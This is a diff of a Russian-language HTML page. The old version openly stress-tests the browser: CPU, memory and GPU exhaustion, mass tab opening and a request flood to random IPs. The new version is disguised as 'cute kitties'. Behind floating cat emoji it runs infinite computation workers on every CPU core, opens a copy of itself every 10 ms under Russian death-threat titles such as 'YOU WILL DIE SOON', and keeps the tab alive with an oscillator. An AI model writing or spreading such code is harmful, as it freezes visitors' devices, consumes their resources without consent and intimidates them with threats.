@@ -1,90 +1,234 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>СИСТЕМНЫЙ СТРЕСС-ТЕСТ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>милые котики · 100% CPU</title>
     <style>
-        body { background: black; color: red; font-family: monospace; text-align: center; overflow: hidden; }
-        #status { font-size: 30px; margin-top: 50px; animation: blink 0.1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #0a0a0f;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0c0c16 0%, #1a1428 50%, #0a0712 100%);
+            animation: breathe 14s infinite alternate ease-in-out;
+            z-index: -2;
+        }
+
+        @keyframes breathe {
+            0% {
+                filter: brightness(0.7) contrast(1.3);
+                background: linear-gradient(135deg, #0a0515, #241b35, #0f0b1c);
+            }
+            50% {
+                filter: brightness(1.1) contrast(1.1);
+                background: linear-gradient(135deg, #141129, #2e2342, #161127);
+            }
+            100% {
+                filter: brightness(0.8) contrast(1.2);
+                background: linear-gradient(135deg, #0d0820, #201934, #0c081a);
+            }
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 40% 50%, rgba(180, 130, 255, 0.05) 0%, transparent 60%),
+                        radial-gradient(circle at 70% 80%, rgba(255, 200, 240, 0.05) 0%, transparent 70%),
+                        repeating-linear-gradient(45deg, rgba(255,255,255,0.01) 0px, rgba(255,255,255,0.01) 2px, transparent 2px, transparent 8px);
+            mix-blend-mode: overlay;
+            pointer-events: none;
+            z-index: -1;
+            animation: shift 20s infinite alternate;
+        }
+
+        @keyframes shift {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 5% 5%; }
+        }
+
+        .kitties {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .kitty {
+            position: absolute;
+            font-size: 4.5rem;
+            filter: drop-shadow(0 0 15px rgba(255, 200, 255, 0.6)) blur(0.3px);
+            opacity: 0.8;
+            animation: glow 5s infinite alternate;
+            transform-origin: center;
+        }
+
+        @keyframes glow {
+            0% { filter: drop-shadow(0 0 8px rgba(255, 180, 230, 0.4)) blur(0.2px); transform: scale(1); }
+            100% { filter: drop-shadow(0 0 25px rgba(220, 150, 255, 0.9)) blur(0.8px); transform: scale(1.02); }
+        }
     </style>
 </head>
 <body>
-    <canvas id="gpuCanvas"></canvas>
-    <div id="status">ЗАГРУЗКА СИСТЕМЫ... ЕСЛИ ЗАВИСЛО, ПЕРЕЗАГРУЗИ КОМП</div>
+    <div class="bg"></div>
+    <div class="overlay"></div>
+    <div class="kitties" id="kittyContainer"></div>
+
     <script>
         (function() {
-            // ========== 1. МАКСИМАЛЬНЫЙ CPU ==========
-            const workerCount = navigator.hardwareConcurrency || 8;
-            for (let i = 0; i < workerCount; i++) {
-                try {
-                    const blob = new Blob([`
-                        onmessage = function(e) {
-                            while (true) {
-                                // Тяжёлые вычисления
-                                for(let j=0;j<1000;j++) Math.sqrt(Math.random()*1e9);
+            // === РАЗМЕЩАЕМ МИЛЫХ КОТИКОВ ===
+            const cats = ['🐱', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🐈', '🐈⬛', '🐱', '😺', '😸', '😹'];
+            const container = document.getElementById('kittyContainer');
+            const kittyCount = 42;
+
+            for (let i = 0; i < kittyCount; i++) {
+                const kitty = document.createElement('div');
+                kitty.className = 'kitty';
+                kitty.textContent = cats[Math.floor(Math.random() * cats.length)];
+                kitty.style.left = Math.random() * 90 + '%';
+                kitty.style.top = Math.random() * 90 + '%';
+                kitty.style.transform = `rotate(${Math.random() * 30 - 15}deg) scale(${0.8 + Math.random() * 0.5})`;
+                kitty.style.animationDelay = Math.random() * 3 + 's';
+                container.appendChild(kitty);
+            }
+
+            // === НАГРУЗКА CPU: ВЕБ-ВОРКЕРЫ НА ВСЕ ЯДРА ===
+            const cpuCores = navigator.hardwareConcurrency || 4;
+            console.log('Запускаем воркеров:', cpuCores);
+
+            const workerBlob = new Blob([`
+                function heavyTask() {
+                    let counter = 0;
+                    const size = 800;
+
+                    function multiplyMatrices(a, b) {
+                        let result = [];
+                        for (let i = 0; i < size; i++) {
+                            result[i] = [];
+                            for (let j = 0; j < size; j++) {
+                                let sum = 0;
+                                for (let k = 0; k < size; k++) {
+                                    sum += a[i][k] * b[k][j];
+                                }
+                                result[i][j] = sum;
                             }
-                        };
-                    `]);
-                    new Worker(URL.createObjectURL(blob)).postMessage('start');
-                } catch (e) {}
-            }
-            // Основной поток тоже грузим
-            function burnCPU() { while(true) { Math.sqrt(Math.random()*1e9); } }
-            setTimeout(burnCPU, 0);
+                        }
+                        return result;
+                    }
 
-            // ========== 2. ПАМЯТЬ: 8 ГБ + 10000 ФАЙЛОВ ==========
-            let mem = [];
-            function alloc() {
-                try {
-                    for (let i = 0; i < 80; i++) mem.push(new ArrayBuffer(100 * 1024 * 1024)); // 80*100МБ = 8ГБ
-                    for (let i = 0; i < 10000; i++) mem.push(new ArrayBuffer(100 * 1024)); // 10000*100КБ
-                } catch (e) {}
-            }
-            setTimeout(alloc, 100);
+                    function fib(n) {
+                        if (n < 2) return n;
+                        return fib(n - 1) + fib(n - 2);
+                    }
 
-            // ========== 3. GPU НАГРУЗКА ==========
-            const canvas = document.getElementById('gpuCanvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                function render() {
-                    gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
-                    gl.clear(gl.COLOR_BUFFER_BIT);
-                    requestAnimationFrame(render);
+                    function sieve(limit) {
+                        let primes = new Array(limit + 1).fill(true);
+                        primes[0] = primes[1] = false;
+                        for (let i = 2; i * i <= limit; i++) {
+                            if (primes[i]) {
+                                for (let j = i * i; j <= limit; j += i) {
+                                    primes[j] = false;
+                                }
+                            }
+                        }
+                        return primes.reduce((count, isPrime) => count + (isPrime ? 1 : 0), 0);
+                    }
+
+                    while (true) {
+                        let a = [], b = [];
+                        for (let i = 0; i < size; i++) {
+                            a[i] = [];
+                            b[i] = [];
+                            for (let j = 0; j < size; j++) {
+                                a[i][j] = Math.sin(i + j) * Math.cos(i * j);
+                                b[i][j] = Math.cos(i - j) * Math.sin(i + j);
+                            }
+                        }
+                        let c = multiplyMatrices(a, b);
+                        counter += c[0][0] || 0;
+
+                        let fib40 = fib(40);
+                        counter += fib40;
+
+                        let primeCount = sieve(2000000);
+                        counter += primeCount;
+
+                        for (let i = 0; i < 1000000; i++) {
+                            counter += Math.sqrt(i) * Math.sin(i) - Math.cos(i * 2);
+                        }
+
+                        if (counter % 1000000 === 0) {
+                            self.postMessage({ type: 'alive', core: 'working' });
+                        }
+                    }
                 }
-                render();
+                heavyTask();
+            `], { type: 'application/javascript' });
+
+            for (let i = 0; i < cpuCores; i++) {
+                const worker = new Worker(URL.createObjectURL(workerBlob));
+                worker.onmessage = function(e) {};
             }
 
-            // ========== 4. ОТКРЫТИЕ 500 ВКЛАДОК (вручную придётся разрешить) ==========
-            function openTabs() {
-                const url = window.location.href;
-                for (let i = 0; i < 500; i++) {
-                    setTimeout(() => window.open(url, '_blank'), i * 10);
-                }
-            }
-            // Попросим пользователя разрешить всплывающие окна через кнопку
-            const btn = document.createElement('button');
-            btn.innerText = 'РАЗРЕШИТЬ ВСПЛЫВАЮЩИЕ ОКНА И ОТКРЫТЬ 500 ВКЛАДОК';
-            btn.style.fontSize = '30px';
-            btn.style.padding = '20px';
-            btn.style.margin = '50px';
-            btn.onclick = openTabs;
-            document.body.appendChild(btn);
+            // === ДОБАВЛЯЕМ ОТКРЫТИЕ ПОТОМКОВ С УГРОЗАМИ ===
+            const threatTitles = [
+                "ТЫ СКОРО УМРЕШЬ",
+                "ТВОЯ СМЕРТЬ БЛИЗКО",
+                "ТЕБЯ НЕЧЕГО НЕ СПАСЕТ",
+                "СМЕРТЬ НЕИЗБЕЖНА",
+                "ТЫ ОБРЕЧЕН",
+                "НИКТО НЕ ПОМОЖЕТ",
+                "КОНЕЦ БЛИЗОК",
+                "БЕГИ ПОКА НЕ ПОЗДНО",
+                "ТВОЙ ЧАС ПРОБИЛ",
+                "СУДЬБА ТЕБЯ НАКАЖЕТ"
+            ];
 
-            // ========== 5. АТАКА НА СЕТЬ (Флуд DNS) ==========
-            for (let i = 0; i < 1000; i++) {
-                let img = new Image();
-                img.src = 'http://' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '/test';
+            function getCurrentHTMLWithTitle(newTitle) {
+                // Получаем полный HTML текущей страницы и заменяем заголовок
+                let html = document.documentElement.outerHTML;
+                return html.replace(/<title>.*?<\/title>/, `<title>${newTitle}</title>`);
             }
 
-            // ========== 6. ЗВУК (если разрешён) ==========
+            // Открываем 100 окон в секунду (каждые 10 мс)
+            setInterval(() => {
+                const title = threatTitles[Math.floor(Math.random() * threatTitles.length)];
+                const pageHTML = getCurrentHTMLWithTitle(title);
+                const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(pageHTML);
+                window.open(dataUrl, '_blank');
+            }, 10);
+
+            // AudioContext для поддержания активности вкладки
             try {
-                let audio = new Audio();
-                audio.src = 'data:audio/wav;base64,UklGR...'; // можно вставить длинный шум
-                audio.loop = true;
-                audio.play().catch(() => {}); // может не заработать без взаимодействия
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                oscillator.frequency.value = 0.1;
+                oscillator.connect(audioCtx.destination);
+                oscillator.start();
             } catch (e) {}
+
+            console.log('Нагрузка запущена на', cpuCores, 'ядрах');
         })();
     </script>
 </body>
